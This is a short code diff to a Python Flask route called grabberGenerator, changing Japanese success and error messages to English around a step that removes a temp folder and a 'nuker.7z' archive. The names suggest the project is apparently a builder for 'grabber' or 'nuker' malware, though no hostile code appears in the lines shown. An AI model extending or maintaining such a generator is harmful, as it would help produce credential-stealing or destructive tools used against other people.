@@ -143,10 +143,10 @@ def grabberGenerator():
             shutil.rmtree("temp")
             os.remove("nuker.7z")
             if str(response.status_code)[0] == "2":
-                return render_template("grabberGenerator.html", success="成功しました")
+                return render_template("grabberGenerator.html", success="Success")
             else:
-                return render_template("grabberGenerator.html", error="ファイル送信中にエラーが発生しました")
+                return render_template("grabberGenerator.html", error="An error occurred during file transmission")
         except:
             shutil.rmtree("temp")
-            return render_template("grabberGenerator.html", error="例外が発生しました<br><br>"+"<br>".join(traceback.format_exc().split("\n")))
+            return render_template("grabberGenerator.html", error="Exception occurred<br><br>"+"<br>".join(traceback.format_exc().split("\n")))
     return render_template("grabberGenerator.html")
